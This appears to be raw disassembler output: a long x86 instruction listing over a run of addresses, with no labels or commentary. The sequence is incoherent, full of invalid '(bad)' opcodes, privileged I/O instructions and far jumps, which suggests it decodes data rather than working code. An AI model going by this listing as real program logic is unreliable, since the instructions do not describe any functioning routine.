  413e86:	test   eax,0x7cea7775
  413e8b:	aam    0x89
  413e8d:	jg     0x413ece
  413e8f:	pushf  
  413e90:	inc    ecx
  413e91:	lods   eax,DWORD PTR ds:[esi]
  413e92:	dec    ebx
  413e93:	sbb    al,0xe5
  413e95:	mov    edx,0x4f240f22
  413e9a:	pop    ebp
  413e9b:	jg     0x413ec5
  413e9d:	aaa    
  413e9e:	jbe    0x413eb6
  413ea0:	stos   BYTE PTR es:[edi],al
  413ea1:	adc    eax,0xbca94918
  413ea6:	add    eax,0x19e873a0
  413eab:	pop    esi
  413eac:	jns    0x413e9a
  413eae:	push   cs
  413eaf:	cli    
  413eb0:	xor    BYTE PTR [edx-0x56ae5951],al
  413eb6:	push   eax
  413eb7:	inc    edi
  413eb8:	mov    al,0x7e
  413eba:	push   es
  413ebb:	jmp    0x29ccf820
  413ec0:	xor    eax,0x32f2b102
  413ec5:	xchg   ebx,eax
  413ec6:	xadd   BYTE PTR [edx],ah
  413ec9:	cs inc edx
  413ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ecc:	int    0x2d
  413ece:	xlat   BYTE PTR ds:[ebx]
  413ecf:	jp     0x413f04
  413ed1:	int    0xd
  413ed3:	js     0x413e71
  413ed5:	sbb    DWORD PTR [ebp-0x37],edx
  413ed8:	xor    eax,0xe7823cfe
  413edd:	xor    BYTE PTR [esi-0x216e42a4],bl
  413ee3:	or     al,0xd1
  413ee5:	sub    cl,BYTE PTR [edi-0x755dec52]
  413eeb:	or     BYTE PTR [ebp+0x7aa56cb5],cl
  413ef1:	pop    ss
  413ef2:	xor    ebx,ecx
  413ef4:	test   al,0x98
  413ef6:	adc    al,0x1c
  413ef8:	ror    BYTE PTR [edx],1
  413efa:	test   BYTE PTR [edx-0xa],ah
  413efd:	jl     0x413f13
  413eff:	jmp    0x124b:0x4ec76ab
  413f06:	mov    ds:0x731866ac,al
  413f0b:	ror    BYTE PTR [esi-0x7eaeaafc],0x76
  413f12:	jmp    0x413f85
  413f14:	(bad)  
  413f16:	(bad)  
  413f17:	jmp    0x8770:0x3ced0459
  413f1e:	mov    dl,0x53
  413f20:	in     eax,dx
  413f21:	(bad)  
  413f23:	sbb    DWORD PTR ds:0x208bc939,ebp
  413f29:	mov    al,0x4d
  413f2b:	push   cs
  413f2c:	daa    
  413f2d:	sahf   
  413f2e:	pop    esi
  413f2f:	inc    esi
  413f30:	cs clc 
  413f32:	sbb    al,0x49
  413f34:	icebp  
  413f35:	in     al,dx
  413f36:	out    dx,al
  413f37:	dec    edi
  413f38:	adc    eax,0x1dedfa8d
  413f3d:	inc    edi
  413f3e:	mov    ds:0xe5025830,eax
  413f43:	retf   
  413f44:	or     ecx,DWORD PTR [ecx+0x2dd35249]
  413f4a:	scas   al,BYTE PTR es:[edi]
  413f4b:	push   ds
  413f4c:	add    DWORD PTR [edi-0x33bf4845],edx
  413f52:	(bad)  
  413f53:	mov    ds:0x8db6aae6,eax
  413f58:	sub    al,0x80
  413f5a:	and    al,0xa8
  413f5c:	dec    edx
  413f5d:	lock dec ebx
  413f5f:	and    esi,edx
  413f61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f62:	outs   dx,DWORD PTR ds:[esi]
  413f63:	jnp    0x413efd
  413f65:	push   0x7fc9c1d1
  413f6a:	jge    0x413f11
  413f6c:	mov    ds:0x4e5f5803,eax
  413f71:	enter  0xbdc7,0xd4
  413f75:	pop    ebp
  413f76:	pop    edx
  413f77:	mov    WORD PTR [ecx+edx*2],?
  413f7a:	jecxz  0x413f97
  413f7c:	fiadd  WORD PTR [eax+eiz*4]
  413f7f:	call   0xaab5:0x5c56e6b8
  413f86:	xchg   ebx,eax
  413f87:	xor    DWORD PTR [edi+0x59],ebp
  413f8a:	sbb    BYTE PTR [ecx],dh
  413f8c:	pop    DWORD PTR [eax+0x5c]
  413f8f:	jb     0x413faf
  413f91:	and    eax,0x9c2cc585
  413f96:	daa    
  413f97:	repz dec esp
  413f99:	popa   
  413f9a:	mov    ah,0x41
  413f9c:	aad    0x3
  413f9e:	inc    ebx
  413f9f:	xchg   DWORD PTR [ebx-0x57296322],ebp
  413fa5:	adc    bh,BYTE PTR [edi]
  413fa7:	cdq    
  413fa8:	rcl    edx,1
  413faa:	mov    dl,0x88
  413fac:	ins    DWORD PTR es:[edi],dx
  413fad:	sbb    BYTE PTR [esi],cl
  413faf:	call   DWORD PTR [eax-0x78f783a3]
  413fb5:	or     bl,BYTE PTR [ebx+0x434fb791]
  413fbb:	enter  0x3efc,0xc7
  413fbf:	iret   
  413fc0:	jmp    0x333f:0xa886040d
  413fc7:	sbb    bl,ah
  413fc9:	repnz icebp 
  413fcb:	cmp    DWORD PTR [edi-0x70],0x68949e94
  413fd2:	xchg   edi,eax
  413fd3:	mov    ch,0xd7
  413fd5:	ja     0x41403b
  413fd7:	scas   al,BYTE PTR es:[edi]
  413fd8:	mov    cl,0xc7
  413fda:	push   0x2159785c
  413fdf:	jo     0x414023
  413fe1:	in     eax,0x11
  413fe3:	mov    dl,0x28
  413fe5:	ret    
  413fe6:	mov    BYTE PTR [esi+ecx*4+0x3a],bh
  413fea:	cmp    BYTE PTR [edx],0x2
  413fed:	xor    BYTE PTR [edi+0x61aad48],bl
  413ff3:	mov    esi,0x9ebb5b8d
  413ff8:	(bad)  
  413ff9:	adc    BYTE PTR [ecx+0x3a],dh
  413ffc:	(bad)  
  413ffd:	push   ecx
  413ffe:	sbb    BYTE PTR [edx+0x12a72486],bl
  414004:	mov    BYTE PTR [ecx-0x674a3384],al
  41400a:	int    0xa8
  41400c:	push   edx
  41400d:	pop    eax
  41400e:	ins    DWORD PTR es:[edi],dx
  41400f:	mov    al,0xb1
  414011:	push   ss
  414012:	mov    WORD PTR [esi+0x3c],?
  414015:	loopne 0x413fc5
  414017:	push   esp
  414018:	sbb    DWORD PTR [edx-0x20],0x1b205ecd
  41401f:	jo     0x413fcd
  414021:	sbb    al,0x81
  414023:	dec    edi
  414024:	dec    edx
  414025:	sti    
  414026:	cmc    
  414027:	pop    ecx
  414028:	pop    ebx
  414029:	inc    edi
  41402a:	test   eax,0x9ae3ee8a
  41402f:	rol    BYTE PTR [edx-0x23],0xe6
  414033:	cmp    eax,0x231da33d
  414038:	sub    DWORD PTR [ecx],eax
  41403a:	ja     0x41408c
  41403c:	inc    ebx
  41403d:	inc    ebp
  41403e:	cmp    BYTE PTR [edx],al
  414040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414041:	ins    BYTE PTR es:[edi],dx
  414042:	cmp    ch,BYTE PTR [esi+0x45493096]
  414048:	loop   0x4140ab
  41404a:	mov    eax,0x1a7d960
  41404f:	ret    0x3b1e
  414052:	mov    esp,edx
  414054:	push   ss
  414055:	or     edi,DWORD PTR [esi-0x62ccf28e]
  41405b:	mov    ah,0x80
  41405d:	push   0xffffffdd
  41405f:	scas   al,BYTE PTR es:[edi]
  414060:	rcr    BYTE PTR [eax],1
  414062:	iret   
  414063:	cld    
  414064:	pushf  
  414065:	test   al,0x38
  414067:	outs   dx,BYTE PTR ds:[esi]
  414068:	jae    0x41403b
  41406a:	xor    DWORD PTR [ecx+0x7b],ecx
  41406d:	and    BYTE PTR ds:0x70682607,bh
  414073:	add    DWORD PTR [edx-0x5c],edx
  414076:	push   edx
  414077:	or     BYTE PTR [eax-0xb35dd06],cl
  41407d:	fcomp  QWORD PTR [esi+0x39]
  414080:	mov    cl,0xd6
  414082:	mov    al,ds:0xe14ae192
  414087:	or     al,0xa9
  414089:	and    al,0xe7
  41408b:	int3   
  41408c:	pop    ebx
  41408d:	ins    BYTE PTR es:[edi],dx
  41408e:	loope  0x4140ad
  414090:	add    eax,0x305b70ea
  414095:	or     ch,BYTE PTR [eax+0x1d]
  414098:	out    dx,al
  414099:	enter  0xf7d,0xc6
  41409d:	pop    esp
  41409e:	inc    ebp
  41409f:	daa    
  4140a0:	jns    0x414120
  4140a2:	pushf  
  4140a3:	inc    ebx
  4140a4:	inc    ebp
  4140a5:	scas   eax,DWORD PTR es:[edi]
  4140a6:	add    al,bl
  4140a8:	out    dx,al
  4140a9:	jl     0x4140ab
  4140ab:	pop    ebx
  4140ac:	inc    eax
  4140ad:	aas    
  4140ae:	retf   0x9f79
  4140b1:	je     0x4140ad
  4140b3:	outs   dx,DWORD PTR ds:[esi]
  4140b4:	xchg   BYTE PTR [esi-0x27],ch
  4140b7:	rcl    BYTE PTR [edx+esi*1-0x50d86788],1
  4140be:	dec    ecx
  4140bf:	add    ecx,eax
  4140c1:	mov    DWORD PTR [ecx+0x3316b920],edx
  4140c7:	imul   esp,DWORD PTR [ecx-0x19780c30],0x12
  4140ce:	cmp    BYTE PTR [ecx],dl
  4140d0:	js     0x4140c3
  4140d2:	xchg   edi,eax
  4140d3:	ror    DWORD PTR [edi+0x49],cl
  4140d6:	mov    ds:0x353c6201,eax
  4140db:	sub    BYTE PTR [eax+0x68ac7c16],al
  4140e1:	jo     0x414153
  4140e3:	retf   0x2b1d
  4140e6:	xchg   DWORD PTR [ebp-0x25234175],ebp
  4140ec:	mov    esp,0xb1226cb6
  4140f1:	mov    esp,0xef008239
  4140f6:	aad    0x55
  4140f8:	jno    0x414157
  4140fa:	(bad)  
  4140fb:	mov    esi,0x47948060
  414100:	sbb    DWORD PTR [edi-0x5cf2d4f4],esp
  414106:	inc    edi
  414107:	xor    al,0x1f
  414109:	mov    cl,0x55
  41410b:	push   ecx
  41410c:	imul   eax,DWORD PTR [edx+0x5e4f0601],0xffffff95
  414113:	in     al,0xab
  414115:	adc    BYTE PTR [ebx+esi*1],cl
  414118:	(bad)  
  41411a:	jmp    0x477d:0x5055e7a0
  414121:	cmp    esp,edx
  414123:	jg     0x4140fd
  414125:	cmp    BYTE PTR [edi-0x2f],cl
  414128:	lods   eax,DWORD PTR ds:[esi]
  414129:	aaa    
  41412a:	mov    bh,0x52
  41412c:	mov    al,0x71
  41412e:	js     0x41414b
  414130:	sub    bl,ah
  414132:	and    edi,edx
  414134:	inc    edx
  414135:	sub    eax,0xd656ed63
  41413a:	outs   dx,BYTE PTR ds:[esi]
  41413b:	xchg   edi,eax
  41413c:	jb     0x4140c6
  41413e:	out    dx,eax
  41413f:	cmp    al,0xcb
  414141:	mov    edi,0x5a22ab06
  414146:	xor    ah,ah
  414148:	lds    esi,FWORD PTR [eax+0x6c]
  41414b:	(bad)  [edx]
  41414d:	ja     0x414194
  41414f:	mov    edi,0xf6cc059d
  414154:	sbb    al,0x3e
  414156:	int3   
  414157:	icebp  
  414158:	sti    
  414159:	add    ah,ch
  41415b:	dec    edx
  41415c:	repnz cmp edi,DWORD PTR [ebp-0x44eea015]
  414163:	add    al,bh
  414165:	jl     0x414150
  414167:	ins    BYTE PTR es:[edi],dx
  414168:	pop    es
  414169:	xor    DWORD PTR [ebx],edx
  41416b:	hlt    
  41416c:	jno    0x414124
  41416e:	arpl   WORD PTR ds:[ecx+0x6938d535],di
  414175:	sub    al,dh
  414177:	leave  
  414178:	mov    ds:0xe15ed6f9,eax
  41417d:	add    dl,dl
  41417f:	shl    DWORD PTR [eax-0x23],1
  414182:	push   ebx
  414183:	rcl    BYTE PTR cs:[edx],1
  414186:	pusha  
  414187:	mov    ds:0x39f9fcd3,al
  41418c:	stos   BYTE PTR es:[edi],al
  41418d:	aad    0x53
  41418f:	push   ds
  414190:	or     eax,0xdde70f75
  414195:	mov    al,0x46
  414197:	outs   dx,DWORD PTR ds:[esi]
  414198:	(bad)  
  414199:	in     eax,0x93
  41419b:	ja     0x414185
  41419d:	push   edi
  41419e:	iret   
  41419f:	jnp    0x4141c6
  4141a1:	mov    edx,0xca2b3ade
  4141a6:	push   esi
  4141a7:	jl     0x41414c
  4141a9:	cmp    ebp,0x1c5e9d37
  4141af:	inc    eax
  4141b0:	ins    BYTE PTR es:[edi],dx
  4141b1:	sahf   
  4141b2:	icebp  
  4141b3:	push   es
  4141b4:	push   edi
  4141b5:	adc    al,0xb2
  4141b8:	test   al,0x25
  4141ba:	int    0x69
  4141bc:	fmul   QWORD PTR [edx-0x1e51e75a]
  4141c2:	jne    0x414233
  4141c4:	retf   0xd9d8
  4141c7:	xor    eax,0x7db1c5a0
  4141cc:	es jnp 0x414164
  4141cf:	hlt    
  4141d0:	adc    cl,BYTE PTR [eax+0x22]
  4141d3:	jmp    0x63c572a6
  4141d8:	mov    cl,0x3b
  4141da:	ds push esp
  4141dc:	iret   
  4141dd:	push   0xffffffc0
  4141df:	jno    0x3104a0e9
  4141e5:	adc    dh,BYTE PTR [esi-0x7ec3a300]
  4141eb:	repnz inc esi
  4141ed:	mov    ch,0xfd
  4141ef:	mov    al,0xe7
  4141f1:	xor    dl,BYTE PTR [edi+0x7d]
  4141f4:	inc    edi
  4141f5:	pushf  
  4141f6:	xchg   ebp,eax
  4141f7:	rcr    DWORD PTR [eax-0x64302f15],0xe8
  4141fe:	ins    DWORD PTR es:[edi],dx
  4141ff:	pop    edx
  414200:	add    DWORD PTR [eax-0x6f171311],ecx
  414206:	(bad)  
  414207:	lock mov eax,ds:0x1005be1f
  41420d:	pop    edi
  41420e:	cmp    BYTE PTR [ebx],al
  414210:	shr    DWORD PTR [ebx],cl
  414212:	and    DWORD PTR [esi-0x481eb4c0],esi
  414218:	pusha  
  414219:	sub    dl,BYTE PTR [edx]
  41421b:	or     al,0x6c
  41421d:	xchg   edi,eax
  41421e:	neg    ah
  414220:	call   0x5129:0xc3c4ee8b
  414227:	sbb    BYTE PTR ds:0x8105d339,dh
  41422d:	adc    cl,BYTE PTR [edx+0x43]
  414230:	aam    0xfe
  414232:	push   ebx
  414233:	out    dx,al
  414234:	pushf  
  414235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414236:	dec    ebp
  414237:	adc    ebx,DWORD PTR [ebp+0x8952bdc]
  41423d:	cmp    ch,BYTE PTR [edi+0x4bf8df0a]
  414243:	inc    esp
  414244:	cmp    DWORD PTR [ebx],ecx
  414246:	or     DWORD PTR [ecx+0x49],esi
  414249:	mov    al,ds:0x8e7311c5
  41424e:	(bad)  
  41424f:	repz out dx,al
  414251:	mov    esi,DWORD PTR [edi]
  414253:	ja     0x414274
  414255:	adc    eax,0xb23dda3c
  41425a:	cmp    al,0xba
  41425c:	or     al,0x13
  41425e:	xchg   ecx,eax
  41425f:	mov    ah,0x8a
  414261:	(bad)  
  414263:	pop    edi
  414264:	(bad)  
  414265:	xchg   ebp,eax
  414266:	mov    WORD PTR [ecx],es
  414268:	jmp    0x4142a8
  41426a:	cmp    dh,ch
  41426c:	gs pop ecx
  41426e:	mov    ah,0x3e
  414270:	adc    al,0x34
  414272:	or     al,BYTE PTR [eax+0x73]
  414275:	cmp    DWORD PTR [ecx],eax
  414277:	std    
  414278:	push   eax
  414279:	push   edi
  41427a:	(bad)  
  41427b:	sub    BYTE PTR [esi],0xa4
  41427e:	in     al,dx
  41427f:	pop    ecx
  414280:	mov    BYTE PTR [edx+0x60],dl
  414283:	outs   dx,BYTE PTR ds:[esi]
  414284:	out    dx,eax
  414285:	popa   
  414286:	das    
  414287:	call   0xfbe1426a
  41428c:	xor    al,0xc1
  41428e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41428f:	lods   al,BYTE PTR ds:[esi]
  414290:	ret    0xdc43
  414293:	ret    0x293d
  414296:	ror    DWORD PTR [ebx+edx*4+0xa5388c7],0x92
  41429e:	inc    ebx
  41429f:	sbb    BYTE PTR [ebx+0x517e80cc],ch
  4142a5:	test   BYTE PTR [edx-0x28],al
  4142a8:	pop    esi
  4142a9:	loop   0x41426c
  4142ab:	out    0xbf,al
  4142ad:	mov    esi,0x336d334b
  4142b2:	sbb    eax,esi
  4142b4:	or     BYTE PTR [ecx-0x3f],bl
  4142b7:	adc    BYTE PTR [ebx-0x76],0xdd
  4142bb:	adc    al,0x1d
  4142bd:	shl    edi,0x87
  4142c0:	(bad)  
  4142c1:	sahf   
  4142c2:	cmp    al,BYTE PTR [eax-0xc59a092]
  4142c8:	xlat   BYTE PTR ds:[ebx]
  4142c9:	xor    al,0xf8
  4142cb:	pop    es
  4142cc:	mov    al,gs:0x25698501
  4142d2:	stos   DWORD PTR es:[edi],eax
  4142d3:	test   BYTE PTR [ebp-0x61],ch
  4142d6:	jmp    0x6eba:0xda5d8ab1
  4142dd:	fs in  eax,0xc6
  4142e0:	pop    ebp
  4142e1:	clc    
  4142e2:	adc    al,0xfa
  4142e4:	sub    al,dh
  4142e6:	inc    ebp
  4142e7:	add    ecx,DWORD PTR [eax-0x24db7eda]
  4142ed:	loope  0x414340
  4142ef:	or     BYTE PTR [esi+0x6bd59573],0x29
  4142f6:	pop    ss
  4142f7:	cmp    dh,BYTE PTR [edx+edi*4-0x5d3e5989]
  4142fe:	jbe    0x414306
  414300:	out    dx,al
  414301:	sub    DWORD PTR [esi+edx*4-0x6e516284],ecx
  414308:	retf   0x873d
  41430b:	mov    cl,0x10
  41430d:	mov    esp,0xfd1ada2a
  414312:	fcom   DWORD PTR [eax+0x66]
  414315:	push   ebx
  414316:	dec    esp
  414317:	mov    bl,0x1f
  414319:	xlat   BYTE PTR ds:[ebx]
  41431a:	mov    al,ds:0x8851652b
  41431f:	push   esi
  414320:	test   edx,eax
  414322:	pop    esi
  414323:	jecxz  0x41438e
  414325:	(bad)  
  414326:	loope  0x4142f8
  414328:	sbb    BYTE PTR [edx+0x28],cl
  41432b:	mov    bh,0x7b
  41432d:	sub    BYTE PTR [ebp+0xe],0xb1
  414331:	vminpd xmm1,xmm1,XMMWORD PTR [eax-0x7be74b59]
  414339:	jecxz  0x414334
  41433b:	or     BYTE PTR [esi],ch
  41433d:	push   cs
  41433e:	dec    edx
  41433f:	push   edx
  414340:	dec    ebp
  414341:	repnz cmp al,0xbe
  414344:	sub    ebp,ebp
  414346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414347:	sub    DWORD PTR [edi+0x32],0x168746
  41434e:	sbb    edi,DWORD PTR [ebp-0x69]
  414351:	fldcw  WORD PTR [edi+0x6268630f]
  414357:	fisubr DWORD PTR [esi+0x6d]
  41435a:	call   DWORD PTR [ebx-0x34]
  41435d:	jmp    0x2dcd08fc
  414362:	or     al,0xbd
  414364:	adc    edi,DWORD PTR [ecx]
  414366:	and    edi,DWORD PTR [edi+ebx*1-0x2e94d26d]
  41436d:	adc    al,0x63
  41436f:	jg     0x4143a4
  414371:	int3   
  414372:	aaa    
  414373:	in     al,0x2a
  414375:	pop    esi
  414376:	or     DWORD PTR [esi-0x11208644],ebp
  41437c:	mov    ds:0xb151c410,al
  414381:	pop    edi
  414382:	mov    ds:0x218d27e1,al
  414387:	pushf  
  414388:	in     al,0xdd
  41438a:	hlt    
  41438b:	outs   dx,BYTE PTR ds:[esi]
  41438c:	lea    ebx,[ecx]
  41438e:	push   0x64
  414390:	add    eax,DWORD PTR fs:[ebx+0x4deba8fd]
  414397:	lahf   
  414398:	inc    esp
  414399:	and    edx,DWORD PTR [edi]
  41439b:	inc    esp
  41439c:	fidivr WORD PTR [esi]
  41439e:	ins    DWORD PTR es:[edi],dx
  41439f:	cli    
  4143a0:	pushf  
  4143a1:	mov    ds:0x2d2b1f85,al
  4143a6:	js     0x414383
  4143a8:	pop    esp
  4143a9:	mov    BYTE PTR ds:0x99b8a2dc,bh
  4143af:	sub    edi,0x1dfb0c62
  4143b5:	outs   dx,BYTE PTR ds:[esi]
  4143b6:	fist   DWORD PTR [edx+0x24825ad7]
  4143bc:	aam    0xf0
  4143be:	cdq    
  4143bf:	imul   esi,DWORD PTR [ebp+0x5b1b41c0],0x22190d7b
  4143c9:	jmp    0x365e:0x5a1e9e91
  4143d0:	fidivr DWORD PTR [ebp+0x35]
  4143d3:	xchg   ebp,eax
  4143d4:	jle    0x414444
  4143d6:	(bad)  
  4143d8:	lock out 0xbf,al
  4143db:	(bad)  
  4143dd:	(bad)  
  4143de:	retf   0xd93
  4143e1:	mov    eax,ds:0x99d5e7d1
  4143e6:	cmp    ebp,0xa362839f
  4143ec:	pop    edx
  4143ed:	pop    eax
  4143ee:	push   cs
  4143ef:	lock inc ebp
  4143f1:	xchg   ecx,eax
  4143f2:	push   edx
  4143f3:	adc    DWORD PTR [ebx+edx*8+0x51],0xffffffc0
  4143f8:	push   0x6
  4143fa:	cs and eax,0xebaad65e
  414400:	out    0x3a,eax
  414402:	adc    bh,BYTE PTR [ebx+0x1d]
  414405:	add    DWORD PTR [edi],esi
  414407:	sbb    al,0xe5
  414409:	mov    dl,0xa7
  41440b:	mov    ecx,0xf002032d
  414410:	loopne 0x414459
  414412:	pop    ebp
  414413:	cmp    dh,BYTE PTR [ebx-0x56]
  414416:	into   
  414417:	pop    ss
  414418:	mov    esp,0xd0d2a750
  41441d:	iret   
  41441e:	out    0x1d,al
  414420:	pop    ebp
  414421:	mov    esi,0x2c33d2b3
  414426:	adc    esp,DWORD PTR [edx+0x7824fb8c]
  41442c:	lea    eax,[ecx-0x52]
  41442f:	out    0xc9,al
  414431:	clc    
  414432:	push   esi
  414433:	sub    al,0x78
  414435:	push   ebx
  414436:	pop    edi
  414437:	leave  
  414438:	aas    
  414439:	shr    BYTE PTR [edi],1
  41443b:	sbb    al,0xdb
  41443d:	icebp  
  41443e:	stos   DWORD PTR es:[edi],eax
  41443f:	loope  0x41443c
  414441:	cdq    
  414442:	lods   eax,DWORD PTR ds:[esi]
  414443:	ins    DWORD PTR es:[edi],dx
  414444:	dec    ebx
  414445:	jb     0x414485
  414447:	jnp    0x4143fa
  414449:	rcr    BYTE PTR [ecx],1
  41444b:	add    BYTE PTR [esi-0x6e],al
  41444e:	pop    ss
  41444f:	sar    BYTE PTR [ebx-0x15a0e07b],cl
  414455:	mov    DWORD PTR [eax],ebp
  414457:	or     DWORD PTR [eax],ecx
  414459:	std    
  41445a:	out    dx,eax
  41445b:	ins    DWORD PTR es:[edi],dx
  41445c:	mov    dl,0xfe
  41445e:	(bad)
  414461:	push   eax
  414462:	xor    DWORD PTR [eax-0x70],eax
  414465:	in     eax,0x4d
  414467:	cmp    dh,cl
  414469:	dec    esi
  41446a:	ss call 0x6eb4d17c
  414470:	push   cs
  414471:	mov    es,ecx
  414473:	pop    ebp
  414474:	stos   BYTE PTR es:[edi],al
  414475:	shl    BYTE PTR [edi+edi*8+0x1d],0x58
  41447a:	aam    0xeb
  41447c:	and    dl,BYTE PTR [ecx+0x9]
  41447f:	mov    ds:0x241d5e1e,al
  414484:	push   eax
  414485:	out    0x2e,eax
  414487:	push   0xffffffb4
  414489:	or     eax,0x1d6266dc
  41448e:	sbb    dl,BYTE PTR [ecx+eiz*2-0xa3e4af4]
  414495:	mov    edx,0x4d4949d9
  41449a:	rol    BYTE PTR [ecx],cl
  41449c:	pop    eax
  41449d:	mov    ah,0x80
  41449f:	jne    0x41445d
  4144a1:	cmp    al,BYTE PTR [ebp-0x69b992ce]
  4144a7:	mov    dl,0x58
  4144a9:	cmp    edx,DWORD PTR [edi]
  4144ab:	mov    bh,0x58
  4144ad:	icebp  
  4144ae:	or     al,0x99
  4144b0:	pop    ecx
  4144b1:	jecxz  0x41451d
  4144b3:	aas    
  4144b4:	add    DWORD PTR [esi+0x7a3877ba],0x6f
  4144bb:	push   ecx
  4144bc:	shr    BYTE PTR [edi+0x681d6e9d],1
  4144c2:	mov    al,BYTE PTR [edi]
  4144c4:	(bad)  
  4144c5:	and    al,0x56
  4144c7:	push   ecx
  4144c8:	jbe    0x414545
  4144ca:	pop    ss
  4144cb:	mov    BYTE PTR es:[edx],bl
  4144ce:	aaa    
  4144cf:	inc    edx
  4144d0:	cmp    eax,0x187a3b99
  4144d5:	jge    0x41450c
  4144d7:	sbb    DWORD PTR ds:0x9b6faa13,esp
  4144dd:	mov    al,0x34
  4144df:	mov    bh,0xb3
  4144e1:	pop    es
  4144e2:	(bad)  
  4144e3:	or     al,0xc2
  4144e5:	push   esp
  4144e6:	dec    edi
  4144e7:	jns    0x4144a1
  4144e9:	and    BYTE PTR [eax+0x53],ah
  4144ec:	into   
  4144ed:	sbb    cl,bl
  4144ef:	jge    0x4144b7
  4144f1:	jns    0x4144d6
  4144f3:	add    cl,BYTE PTR [eax-0x58]
  4144f6:	fstp   DWORD PTR ds:0xf4f6f076
  4144fc:	int    0x92
  4144fe:	ins    BYTE PTR es:[edi],dx
  4144ff:	add    BYTE PTR [ebp+0x7a],0x7a
  414503:	addr16 pop ebp
  414505:	das    
  414506:	into   
  414507:	sbb    BYTE PTR [edi+0x309cd287],cl
  41450d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41450e:	popa   
  41450f:	or     eax,0x557f52fb
  414514:	jae    0x4144a0
  414516:	dec    esi
  414517:	scas   eax,DWORD PTR es:[edi]
  414518:	ror    BYTE PTR [edx],0x6a
  41451b:	rcr    BYTE PTR [eax-0x1c747b88],cl
  414521:	mov    bh,al
  414523:	lahf   
  414524:	fwait
  414525:	lods   al,BYTE PTR ds:[esi]
  414526:	xchg   esp,eax
  414527:	mov    esp,0x71f5391f
  41452c:	dec    ebx
  41452d:	push   esp
  41452e:	es mov esi,0xfe6997f8
  414534:	dec    esi
  414535:	xor    eax,0x8617a880
  41453a:	add    eax,0x3b832f2
  41453f:	call   0x9f7e:0x3130cb76
  414546:	xor    dl,dl
  414548:	mov    ah,0xdc
  41454a:	jl     0x41457f
  41454c:	inc    edx
  41454d:	cmp    dl,0x80
  414550:	xor    ebx,DWORD PTR [ebx+0x4fdddc71]
  414556:	adc    al,0x3a
  414558:	adc    ch,bh
  41455a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41455b:	in     al,0x73
  41455d:	jmp    0x4145a7
  41455f:	in     al,dx
  414560:	adc    cl,BYTE PTR [ebx+0x2ff095d2]
  414566:	rcl    DWORD PTR [ebx],1
  414568:	sub    al,0x2b
  41456a:	ss pop es
  41456c:	cmp    cl,BYTE PTR [ecx-0x52e2ee69]
  414572:	dec    ebp
  414573:	call   0x3ec1:0xb21a6ac
  41457a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41457b:	inc    edx
  41457c:	pop    esp
  41457d:	jmp    0x414571
  41457f:	mov    ds:0x2cd37e18,al
  414584:	mov    ecx,0xacfb2541
  414589:	sub    BYTE PTR [eax+eiz*8],dl
  41458c:	inc    ecx
  41458d:	or     BYTE PTR [edx-0x27],bl
  414590:	lods   al,BYTE PTR ds:[esi]
  414591:	shr    BYTE PTR [edx+0x20],cl
  414594:	mov    ch,0x6f
  414596:	mov    ah,0x4
  414598:	test   DWORD PTR [edi+eax*4-0x60],esp
  41459c:	sub    ecx,DWORD PTR [ebp-0x5a]
  41459f:	mov    eax,0x4beb5e26
  4145a4:	in     al,dx
  4145a5:	adc    edi,DWORD PTR [ecx+0x2587c4bf]
  4145ab:	data16 ja 0x414628
  4145ae:	scas   al,BYTE PTR es:[edi]
  4145af:	dec    ebp
  4145b0:	dec    eax
  4145b1:	stos   DWORD PTR es:[edi],eax
  4145b2:	pop    ss
  4145b3:	arpl   ax,si
  4145b5:	jge    0x4145d6
  4145b7:	jl     0x41456d
  4145b9:	std    
  4145ba:	xchg   DWORD PTR [ecx+0x8406ed5],ebp
  4145c0:	or     edi,esi
  4145c2:	dec    edx
  4145c3:	cmp    al,0x3e
  4145c5:	xchg   esi,eax
  4145c6:	dec    ecx
  4145c7:	mov    esi,DWORD PTR [eax-0x51cb7a00]
  4145cd:	in     al,0x74
  4145cf:	dec    edi
  4145d0:	mov    al,fs:0x1436ec2a
  4145d6:	sbb    BYTE PTR [ecx+0x1ced1b51],0xe1
  4145dd:	pop    ds
  4145de:	pop    ebp
  4145df:	xchg   esi,eax
  4145e0:	les    esi,FWORD PTR [ebp-0x51]
  4145e3:	jbe    0x41465e
  4145e5:	mov    WORD PTR [ebx],?
  4145e7:	in     eax,0x2
  4145e9:	inc    esi
  4145ea:	fwait
  4145eb:	inc    bh
  4145ed:	sub    al,bh
  4145ef:	jp     0x4145e9
  4145f1:	sbb    dh,cl
  4145f3:	cdq    
  4145f4:	outs   dx,DWORD PTR ds:[esi]
  4145f5:	inc    eax
  4145f6:	cli    
  4145f7:	sti    
  4145f8:	fcmovnbe st,st(3)
  4145fa:	mov    ecx,0xb7d960c8
  4145ff:	lock pop esi
  414601:	pop    eax
  414602:	pop    ebx
  414603:	dec    esi
  414604:	mov    edi,0x16f47b53
  414609:	arpl   WORD PTR [esi-0x52],sp
  41460c:	lods   al,BYTE PTR ds:[esi]
  41460d:	repnz dec ebp
  41460f:	xchg   edx,eax
  414610:	out    dx,al
  414611:	(bad)  
  414612:	int    0x76
  414614:	cmp    al,BYTE PTR [ebx]
  414616:	retf   0x8f75
  414619:	push   es
  41461a:	mov    dl,0x1b
  41461c:	in     eax,dx
  41461d:	push   es
  41461e:	and    eax,0xeb87d93
  414623:	sbb    DWORD PTR [ebx-0x3b],ebp
  414626:	div    DWORD PTR [eax-0x5c]
  414629:	fidiv  DWORD PTR [eax]
  41462b:	sbb    BYTE PTR [ebx+eiz*1-0x625b590],bl
  414632:	je     0x4145c3
  414634:	test   eax,0x55fe759f
  414639:	fist   DWORD PTR [edx+0x1cb3fe36]
  41463f:	push   ecx
  414640:	ror    DWORD PTR fs:[eax-0x1b6409c7],cl
  414647:	mov    DWORD PTR [ecx-0x14],ecx
  41464a:	es (bad) 
  41464c:	jp     0x414684
  41464e:	sbb    BYTE PTR [edi+ecx*4-0x47],ah
  414652:	(bad)  
  414653:	femms  
  414655:	push   esp
  414656:	xor    al,0xea
  414658:	or     BYTE PTR [ecx-0x5a],ah
  41465b:	mov    edx,fs
  41465d:	mov    eax,ds:0xe18bcb4d
  414662:	ds enter 0x7cc4,0xa
